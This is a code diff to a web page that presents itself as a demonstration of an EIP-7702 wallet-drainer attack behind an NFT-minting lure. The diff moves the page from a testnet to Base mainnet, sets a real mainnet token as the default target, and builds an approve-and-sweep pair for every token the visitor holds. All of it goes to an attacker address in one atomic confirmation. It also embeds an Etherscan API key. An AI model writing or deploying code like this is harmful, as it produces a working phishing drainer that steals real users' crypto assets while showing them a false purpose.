@@ -202,11 +202,15 @@
           The attacker constructed a 3-call batch executed atomically in ONE confirmation:
           <div class="code-block">
 [<br>
-&nbsp;&nbsp;{to: DEMO_TOKEN, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: delegator, data: sweep(DEMO_TOKEN)}<br>
+&nbsp;&nbsp;// repeated for every token in wallet:<br>
+&nbsp;&nbsp;{to: TOKEN_1, data: approve(delegator, MAX_UINT256)},<br>
+&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_1)},<br>
+&nbsp;&nbsp;{to: TOKEN_2, data: approve(delegator, MAX_UINT256)},<br>
+&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_2)},<br>
+&nbsp;&nbsp;...<br>
 ]
           </div>
-          One confirmation approves the delegator for all tokens, then sweeps all tokens via the delegator. Fully atomic.
+          One confirmation executes an approve + sweep pair for every token in the wallet simultaneously. All approvals and sweeps happen atomically — if any call fails, all revert.
         </div>
       </div>
 
@@ -233,7 +237,7 @@
     </div>
     <div class="info-card">
       <div class="info-card-label">Delegator contract (TokenSweepDelegator)</div>
-      <div class="info-card-value">0x4d3d6d44Ec659FaFc6A212b9867feFacbfE01633</div>
+      <div class="info-card-value">0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">Attacker address (received funds)</div>
@@ -250,7 +254,7 @@
     </div>
     <div class="info-card">
       <div class="info-card-label">Transaction type</div>
-      <div class="info-card-value">Type 4 (EIP-7702) — Batch execution via wallet_sendCalls</div>
+      <div class="info-card-value">Type 4 (EIP-7702) — Batch execution via wallet_sendCalls (Base Mainnet)</div>
     </div>
 
     <div class="defense-section">
@@ -281,13 +285,13 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const SEPOLIA_CHAIN_ID   = 11155111;
-  const SEPOLIA_RPC        = "https://ethereum-sepolia-rpc.publicnode.com";
-  const DELEGATOR_ADDRESS  = "0x4d3d6d44Ec659FaFc6A212b9867feFacbfE01633";
+  const BASE_CHAIN_ID      = 8453;
+  const BASE_RPC           = "https://mainnet.base.org";
+  const DELEGATOR_ADDRESS  = "0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E";
   const ATTACKER_ADDRESS   = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
   const ETHERSCAN_API_KEY  = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
   const ETHERSCAN_V2_BASE  = "https://api.etherscan.io/v2/api";
-  const DEMO_TOKEN_DEFAULT = "0x4a2103aa8f00c1d453973268a3cce587d055330b";
+  const DEMO_TOKEN_DEFAULT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
 
   let userAddress = null;
   let userBalance = null;
@@ -324,7 +328,7 @@
   async function fetchTokenBalances(address) {
     try {
       const url = new URL(ETHERSCAN_V2_BASE);
-      url.searchParams.set('chainid',    SEPOLIA_CHAIN_ID);
+      url.searchParams.set('chainid',    BASE_CHAIN_ID);
       url.searchParams.set('module',     'account');
       url.searchParams.set('action',     'tokentx');
       url.searchParams.set('address',    address);
@@ -395,11 +399,11 @@
     try {
       const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
       const badge = document.getElementById('navBadge');
-      if (chainId === SEPOLIA_CHAIN_ID) {
-        badge.textContent = 'Sepolia';
+      if (chainId === BASE_CHAIN_ID) {
+        badge.textContent = 'Base';
         badge.style.color = 'var(--green)';
       } else {
-        badge.textContent = `Chain ${chainId} — Switch to Sepolia`;
+        badge.textContent = `Chain ${chainId} — Switch to Base`;
         badge.style.color = 'var(--red)';
       }
     } catch(e) {}
@@ -417,8 +421,8 @@
 
     try {
       const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
-      if (chainId !== SEPOLIA_CHAIN_ID) {
-        alert("Please switch to Sepolia testnet");
+      if (chainId !== BASE_CHAIN_ID) {
+        alert("Please switch to Base mainnet");
         showPhase('phase-lure');
         return;
       }
@@ -426,7 +430,7 @@
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
 
-      provider = new ethers.JsonRpcProvider(SEPOLIA_RPC);
+      provider = new ethers.JsonRpcProvider(BASE_RPC);
       const balanceWei = await provider.getBalance(userAddress);
       userBalance = ethers.formatEther(balanceWei);
 
@@ -442,47 +446,43 @@
 
       renderSteps([
         { num:'1', state:'done',    title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
-        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing atomic sweep` },
+        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing ${heldTokens.length > 0 ? heldTokens.length * 2 : 2}-call atomic sweep` },
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
       ]);
 
 
-      const DEMO_TOKEN = heldTokens.length > 0
-        ? heldTokens[0].contractAddress
-        : DEMO_TOKEN_DEFAULT;
-      console.log("🎯 Target token:", DEMO_TOKEN);
+      // Build target list: all detected tokens, or fall back to demo token
+      const targetTokens = heldTokens.length > 0
+        ? heldTokens.map(t => t.contractAddress)
+        : [DEMO_TOKEN_DEFAULT];
+      console.log("🎯 Target tokens:", targetTokens);
 
       const APPROVE_ABI      = ["function approve(address spender, uint256 amount) external returns (bool)"];
       const approveInterface = new ethers.Interface(APPROVE_ABI);
-      const approveData      = approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256]);
 
       const SWEEP_ABI          = ["function sweep(address token) external"];
       const delegatorInterface = new ethers.Interface(SWEEP_ABI);
-      const sweepData          = delegatorInterface.encodeFunctionData("sweep", [DEMO_TOKEN]);
 
-      // Fix: plain ETH transfer omits the `data` field entirely.
-      // wallet_sendCalls rejects data: "0x" — the schema requires /^0x[0-9a-f]+$/
-      // (at least one hex digit after 0x), so an empty data field must be absent.
-      const maliciousCalls = [
+      // One approve + one sweep per token, all in a single atomic batch
+      const maliciousCalls = targetTokens.flatMap(tokenAddr => [
         {
-          to:    DEMO_TOKEN,
+          to:    tokenAddr,
           value: "0x0",
-          data:  approveData
+          data:  approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256])
         },
-
         {
           to:    DELEGATOR_ADDRESS,
           value: "0x0",
-          data:  sweepData
+          data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr])
         }
-      ];
+      ]);
 
       console.log(`🎯 Batch: ${maliciousCalls.length} calls`);
       console.log("📋 Calls:", JSON.stringify(maliciousCalls, null, 2));
 
       const payload = {
         version:        "2.0.0",
-        chainId:        "0xaa36a7",
+        chainId:        "0x2105",
         calls:          maliciousCalls,
         atomicRequired: true
       };
@@ -511,7 +511,7 @@
         : `DEMO tokens (swept via atomic approve + sweep)`;
       document.getElementById('displayTokens').textContent    = tokenSummary;
       document.getElementById('displayBatchSize').textContent =
-        `${maliciousCalls.length} calls (1x approve + 1x token sweep)`;
+        `${maliciousCalls.length} calls (${targetTokens.length} token${targetTokens.length > 1 ? "s" : ""} × approve + sweep)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
@@ -526,7 +526,7 @@
         document.getElementById('displayTokens').textContent  = heldTokens.length > 0
           ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
           : `None detected (default target: ${shortAddr(DEMO_TOKEN_DEFAULT)})`;
-        document.getElementById('displayBatchSize').textContent = '2 calls (1x approve + 1x token sweep)';
+        document.getElementById('displayBatchSize').textContent = `${maliciousCalls ? maliciousCalls.length : 2} calls`;
         showPhase('phase-dashboard');
       } else {
         showPhase('phase-lure');
